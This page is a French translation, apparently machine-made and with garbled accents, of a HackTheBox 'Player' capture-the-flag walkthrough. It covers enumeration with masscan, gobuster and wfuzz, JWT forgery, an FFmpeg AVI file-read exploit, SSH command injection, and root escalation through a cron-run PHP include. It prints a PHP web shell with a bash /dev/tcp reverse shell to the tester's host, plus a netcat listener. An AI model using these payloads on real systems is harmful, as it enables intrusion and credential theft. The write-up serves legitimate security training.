<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§† üëéüèæ üíáüèº Hack The Box - Walkthrough Player. FFmpeg exploit, JWT et diverses listes Web üóæ üòπ üö∂üèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Je continue de publier des solutions envoy√©es pour un traitement ult√©rieur √† partir du site HackTheBox . J'esp√®re que cela aidera au moins quelqu'un √†...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Walkthrough Player. FFmpeg exploit, JWT et diverses listes Web</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/484568/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/bb/r0/b9/bbr0b9iushfrexjxkdevfryxjmo.png" alt="image"></div><br>  Je continue de publier des solutions envoy√©es pour <a href="https://www.hackthebox.eu/" rel="nofollow">un traitement ult√©rieur √†</a> partir du site <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  J'esp√®re que cela aidera au moins quelqu'un √† se d√©velopper dans le domaine de la s√©curit√© de l'information.  Dans cet article, nous allons parcourir le JWT, effectuer des √©num√©rations Web telles que la recherche de r√©pertoires, de sous-domaines et de fichiers de sauvegarde, nous exploiterons SSRF dans l'encodeur FFmpeg et RCE dans SSH. <br><br>  La connexion au laboratoire se fait via VPN.  Il est recommand√© de ne pas se connecter √† partir d'un ordinateur professionnel ou d'un h√¥te o√π les donn√©es importantes pour vous sont disponibles, car vous vous retrouvez sur un r√©seau priv√© avec des personnes qui connaissent quelque chose dans le domaine de la s√©curit√© de l'information :) <br><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se d√©velopper dans l'un des domaines de l'information et de la s√©curit√© informatique, j'√©crirai et parlerai des cat√©gories suivantes: <br><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de r√©seau (r√©seau); </li><li>  reverse (Reverse Engineering); </li><li>  st√©ganographie (Stegano); </li><li>  recherche et exploitation des vuln√©rabilit√©s WEB. </li></ul><br>  En plus de cela, je partagerai mon exp√©rience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les r√©seaux sans fil et les r√©seaux locaux, r√©alisation de pentests et √©criture d'exploits. <br><a name="habracut"></a><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai cr√©√© une <a href="https://t.me/RalfHackerChannel" rel="nofollow">cha√Æne dans Telegram</a> et un <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">groupe pour discuter de tout probl√®me</a> dans le domaine de l'ICD.  Aussi, je consid√©rerai personnellement vos demandes, questions, suggestions et recommandations <a href="https://t.me/hackerralf8" rel="nofollow">personnelles et r√©pondrai √† tout le monde</a> . <br><br>  Toutes les informations sont fournies √† des fins √©ducatives uniquement.  L'auteur de ce document n'assume aucune responsabilit√© pour tout dommage caus√© √† quelqu'un du fait de l'utilisation des connaissances et des m√©thodes obtenues √† la suite de l'√©tude de ce document. <br></div></div><br><h2>  Intelligence </h2><br><h3>  Balayage de port </h3><br>  Cette machine a une adresse IP de 10.10.10.145, que j'ajoute √† / etc / hosts. <br><br><pre><code class="plaintext hljs">10.10.10.145 player.htb</code> </pre> <br>  Tout d'abord, nous analysons les ports ouverts.  Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan.  Nous analysons tous les ports TCP et UDP √† partir de l'interface tun0 √† une vitesse de 1000 paquets par seconde. <br><br><pre> <code class="plaintext hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.145 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/p-/kc/xh/p-kcxho2ru_qgebovjk_qcpesiq.png" alt="image"><br><br>  Ensuite, vous devez collecter plus d'informations sur les ports connus.  Pour ce faire, utilisez nmap avec l'option -A. <br><br><pre> <code class="plaintext hljs">nmap -A player.htb -p22,80,6686</code> </pre> <br><img src="https://habrastorage.org/webt/ym/go/nb/ymgonb33gvbuxfi6sxuyjkajpk0.png" alt="image"><br><br>  Ainsi, l'h√¥te ex√©cute SSH sur les ports 22 et 6686, ainsi que le serveur Web Apache sur 80. <br><br><h3>  √ânum√©rations Web </h3><br>  Tout d'abord, allez regarder le web.  Mais h√©las, il n'y a rien d'int√©ressant. <br><br><img src="https://habrastorage.org/webt/oh/jr/bo/ohjrbobvhbqyl2c8vvonhoglhwa.png" alt="image"><br><br>  Dans ce cas, vous devez g√©n√©ralement analyser les r√©pertoires.  Pour ce faire, utilisez un gobuster rapide.  Dans les param√®tres nous indiquons que nous voulons scanner les r√©pertoires (dir), indiquer le site (-u), la liste des mots (-w), les extensions qui nous int√©ressent (-x), le nombre de threads (-t). <br><br><pre> <code class="plaintext hljs">gobuster dir -t 128 -u http://player.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php</code> </pre> <br>  De ces r√©pertoires, un lanceur int√©ressant.  Il indique qu'il s'agit d'un service de montage vid√©o et que nous avons besoin d'un e-mail valide. <br><br><img src="https://habrastorage.org/webt/jp/no/bm/jpnobmm6lw-xeb7_ykrudxj9kjk.png" alt="image"><br><br>  Apr√®s avoir jou√© un peu avec le formulaire, j'ai remarqu√© qu'il envoie des donn√©es √† la page /launcher/dee8dc8a47256c64630d803a4c40786c.php, l√†, il v√©rifie et redirige. <br><br><img src="https://habrastorage.org/webt/tt/oi/px/ttoipxckuyhstzcqe-popoqwchc.png" alt="image"><br><br>  De tout ce que nous avons, rien ni rien ne nous donnera.  La prochaine √©tape de la liste est la recherche de sous-domaines.  R√©cemment, apr√®s m'avoir conseill√© d'utiliser wfuzz, je l'utilise et conseille la m√™me chose aux autres.  Sp√©cifiez l'en-t√™te (-H), le dictionnaire (-w), l'URL (-u) et excluez le code de r√©ponse 403 (--hc 403). <br><br><pre> <code class="plaintext hljs">wfuzz -H 'HOST:FUZZ.player.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u player.htb --hc 403</code> </pre> <br><img src="https://habrastorage.org/webt/wq/en/in/wqeninubpwhxzbccfj8j86hp4gu.png" alt="image"><br><br>  Ainsi, nous avons trouv√© trois sous-domaines qui doivent √©galement √™tre ajout√©s √† / etc / hosts. <br><br><pre> <code class="plaintext hljs">10.10.10.145 dev.player.htb 10.10.10.145 staging.player.htb 10.10.10.145 chat.player.htb</code> </pre> <br>  Sur dev, il n'y a qu'un formulaire d'autorisation, sur le chat uniquement le chat inutile et sur la mise en place d'un formulaire pour certains contacts. <br><br><img src="https://habrastorage.org/webt/-6/tp/fn/-6tpfnjqnnouopalozw-jr1xd0g.png" alt="image"><br><br><img src="https://habrastorage.org/webt/pc/iw/ho/pciwhok-r54hnfehabmxt6zh_g4.png" alt="image"><br><br><img src="https://habrastorage.org/webt/oz/5h/im/oz5himhvh82_re3xflvw-6ewdqu.png" alt="image"><br><br>  Apr√®s avoir un peu test√© le formulaire, tout ce que nous avons est une redirection vers 501.php et quelques donn√©es avec l'erreur indiqu√©e. <br><br><img src="https://habrastorage.org/webt/nd/74/jy/nd74jyppx_mm5mwq8ouhqenk3lc.png" alt="image"><br><br><img src="https://habrastorage.org/webt/3q/p9/nv/3qp9nv083j13vup29ewzrwlayjg.png" alt="image"><br><br><img src="https://habrastorage.org/webt/4p/ag/hx/4paghx3jgtbio0ii5icw_wfsmfs.png" alt="image"><br><br>  Mais encore une fois, ce n'√©tait pas suffisant.  De plus, ce que j'oublie habituellement, j'ai d√©cid√© de v√©rifier les sauvegardes de fichiers.  Il a donc √©t√© d√©couvert /launcher/dee8dc8a47256c64630d803a4c40786c.php~ <br><br><img src="https://habrastorage.org/webt/0a/o2/ns/0ao2nsdzknv6c-kysmofeneq1fm.png" alt="image"><br><br>  Dans ce code, le JWT (jeton) est d√©cod√© et v√©rifi√©.  Selon la v√©rification, une redirection vers l'une des pages se produit.  Si le jeton n'est pas fourni, nous lui sommes attribu√©s. <br><br>  Puisque nous connaissons la cl√© et la valeur finale, nous pouvons l'encoder et obtenir un jeton valide.  Cela peut √™tre fait en utilisant ce <a href="https://jwt.io/" rel="nofollow">site</a> . <br><br><img src="https://habrastorage.org/webt/nr/-m/w9/nr-mw9fadamuwv0ztqpfo5ze-fq.png" alt="image"><br><br>  Nous obtenons un jeton cod√©.  Et remplacez-le dans la demande. <br><br><img src="https://habrastorage.org/webt/7d/6j/zg/7d6jzgcvhge3zezoxl3t0z1lgni.png" alt="image"><br><br><img src="https://habrastorage.org/webt/0x/xx/59/0xxx59pasbeaw_etpf4n3dxxd5w.png" alt="image"><br><br>  En cons√©quence, un formulaire de t√©l√©chargement de fichier multim√©dia nous a √©t√© pr√©sent√©.  Apr√®s avoir t√©l√©charg√© l'image, on nous a propos√© de t√©l√©charger le fichier multim√©dia au format AVI. <br><br><img src="https://habrastorage.org/webt/31/if/1m/31if1mhd0poc6kiv3ekoay0s0dm.png" alt="image"><br><br><h2>  Point d'entr√©e </h2><br>  Depuis AVI est cr√©√© √† partir de notre fichier, nous pouvons utiliser un exploit qui vous permet de lire des fichiers.  Le code peut √™tre pris <a href="https://github.com/cujanovic/SSRF-Testing/tree/master/ffmpeg" rel="nofollow">ici</a> .  Voyons cela et voyons le fichier / etc / passwd. <br><br><img src="https://habrastorage.org/webt/iw/ga/h4/iwgah4tm0hzz1op1issdxv0cecu.png" alt="image"><br><br>  Voyons cela et voyons le fichier / etc / passwd. <br><br><pre> <code class="plaintext hljs">python3 gen_avi.py file:///etc/passwd passwd.avi</code> </pre> <br>  Apr√®s avoir t√©l√©charg√© et ouvert le fichier, nous observons le fichier / etc / passwd. <br><br><img src="https://habrastorage.org/webt/hx/bj/vn/hxbjvn1eoionvyyjvow0l-9v990.png" alt="image"><br><br>  Puisque nous pouvons lire des fichiers, nous devons collecter une liste de ceux que nous connaissons.  Nous rappelons les erreurs dans le fichier contact.php.  Lisons tous les fichiers qui y sont r√©pertori√©s. <br><br><img src="https://habrastorage.org/webt/ux/j_/jn/uxj_jne-eu0hunadv08k5incsw0.png" alt="image"><br><br>  Et il n'y avait rien d'int√©ressant dans le fichier de contact, le correctif n'a pas pu √™tre lu, mais dans service_config nous trouvons le login et le mot de passe. <br><br><img src="https://habrastorage.org/webt/km/ws/ms/kmwsmsxv4eidorbqbj89dcdfp3k.png" alt="image"><br><br>  Essayons de nous connecter √† dev.player.htb avec eux - les donn√©es ne correspondent pas, mais il y a deux autres SSH.  Le port 22 est un √©chec, mais sur 6686 nous obtenons un shell. <br><br><img src="https://habrastorage.org/webt/ji/jz/qa/jijzqasnvkzik7bnlitxchgcjj0.png" alt="image"><br><br><h2>  UTILISATEUR </h2><br>  Mais le shell est limit√©, et je me suis souvenu de la version 7.2 et j'ai d√©cid√© de v√©rifier les exploits. <br><br><img src="https://habrastorage.org/webt/wi/4x/76/wi4x76zif9q8z19o8i9nqt2vwzo.png" alt="image"><br><br>  Ainsi, si nous avons des informations d'identification, nous pouvons ex√©cuter l'injection de commande. <br><br><img src="https://habrastorage.org/webt/kd/e9/ql/kde9ql_j-ypbpww0bcd47pgeujq.png" alt="image"><br><br><img src="https://habrastorage.org/webt/kc/8y/xn/kc8yxngloakvlyoboxb4bxalhuw.png" alt="image"><br><br>  Ils nous fournissent √©galement une liste de commandes pour lire et √©crire des fichiers.  Nous lisons le drapeau de l'utilisateur. <br><br><img src="https://habrastorage.org/webt/ti/bq/fs/tibqfsyq88nlejyzwepkun1ujlq.png" alt="image"><br><br><h2>  RACINE </h2><br>  Maintenant, nous devrions avoir suffisamment de droits pour lire fix.php <br><br><img src="https://habrastorage.org/webt/vp/jh/f2/vpjhf23ilb_hls61cdbu-02gmo0.png" alt="image"><br><br>  Nous y trouvons des donn√©es int√©ressantes qui correspondent d√©j√† √† dev.player.htb.  Et l√†, nous trouvons le projet. <br><br><img src="https://habrastorage.org/webt/y3/zx/l3/y3zxl3s7n0r0nvscxspha6kwv8k.png" alt="image"><br><br>  Et ce fichier est accessible via l'acc√®s √† partir de l'environnement externe.  Autrement dit, nous pouvons placer la coquille. <br><br><img src="https://habrastorage.org/webt/fn/mk/w0/fnmkw02ycqbdpfdr_nx9xpiagzo.png" alt="image"><br><br>  Pour ce faire, ouvrez votre projet. <br><br><img src="https://habrastorage.org/webt/c4/8-/lc/c48-lc6ag3wyco_et3vpnimdoj0.png" alt="image"><br><br>  Ensuite, cr√©ez un fichier avec le shell suivant. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> exec(<span class="hljs-string"><span class="hljs-string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.161/4321 0&gt;&amp;1'"</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/zs/sw/rz/zsswrzlvqf3qtmiob4by4t4lv6m.png" alt="image"><br><br>  Ouvrez maintenant la session √† l'aide de netcat. <br><br><pre> <code class="plaintext hljs">nc -lvp 4321</code> </pre> <br>  Ensuite, nous passons √† notre dossier. <br><br><img src="https://habrastorage.org/webt/0b/fz/ov/0bfzovw_lfi9g3pmm8f8x2mptg8.png" alt="image"><br><br><img src="https://habrastorage.org/webt/mn/ah/0s/mnah0sqeoapkufudh8mhe7fmcdo.png" alt="image"><br><br>  Apr√®s avoir termin√© les √©num√©rations et v√©rifi√© quelques autres options, nous nous arr√™tons √† la v√©rification des processus.  Gr√¢ce √† pspy64, vous pouvez d√©terminer que le script buff.php est ex√©cut√© de temps en temps avec un UID de 0, c'est-√†-dire  en tant que root. <br><br><img src="https://habrastorage.org/webt/zq/h_/bv/zqh_bvp5qq9ssck_c3lo34d1rxq.png" alt="image"><br><br>  Voyons ce que fait le script. <br><br><img src="https://habrastorage.org/webt/bl/4y/fq/bl4yfqjtz1u4ua4hntefwnnmdkk.png" alt="image"><br><br>  Lorsque nous essayons d'ajouter du code √† ce fichier, nous rencontrons un probl√®me - nous n'avons pas de droits. <br><br><img src="https://habrastorage.org/webt/54/mw/53/54mw53brppzgzamhmujxvaqu9cm.png" alt="image"><br><br>  Mais dans le script, un autre fichier est inclus, dans lequel nous avons le droit d'√©crire. <br><br><img src="https://habrastorage.org/webt/wz/i0/tn/wzi0tnmjpu6uagtf7se_wmctwr8.png" alt="image"><br><br>  Nous allons √©crire le shell d√©j√† utilis√© par nous dans ce fichier, et dans netcat, nous attendons la connexion. <br><br><img src="https://habrastorage.org/webt/ni/td/aw/nitdawhy84twnrr5apncrc_2yji.png" alt="image"><br><br>  De cette fa√ßon, nous obtenons un maximum de privil√®ges. <br><br>  Vous pouvez nous rejoindre sur <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pouvons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr484568/">https://habr.com/ru/post/fr484568/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr484550/index.html">L'holacratie est-elle n√©cessaire dans une entreprise informatique: avantages et inconv√©nients</a></li>
<li><a href="../fr484552/index.html">Lecture pour un geek: 10 documents sur la technologie audio - comment les pistes musicales, les enregistrements HD et le son 8D sont organis√©s</a></li>
<li><a href="../fr484554/index.html">Cr√©er un bouton avec Ripple Effect pour XMars UI</a></li>
<li><a href="../fr484556/index.html">Alors, quand est-il encore possible d'utiliser! Important?</a></li>
<li><a href="../fr484564/index.html">Nous √©crivons un pilote pour un ordinateur portable pour le plaisir et le profit, ou comment s'engager dans le noyau m√™me si vous √™tes un imb√©cile</a></li>
<li><a href="../fr484572/index.html">Mon approche de gestion du temps / des t√¢ches avec VSCode</a></li>
<li><a href="../fr484574/index.html">Pas de tiques! Plantes vs vecteur de la maladie de Lyme</a></li>
<li><a href="../fr484578/index.html">Objectifs de niveau de service - Exp√©rience Google (traduction de la section Google SRE Book)</a></li>
<li><a href="../fr484580/index.html">Ce que vous devez savoir sur les simulateurs de m√©moire</a></li>
<li><a href="../fr484582/index.html">ASP.NET MVC - Entity Framework, MySQL et utilisation de Dependency Resolver pour s√©lectionner un r√©f√©rentiel</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>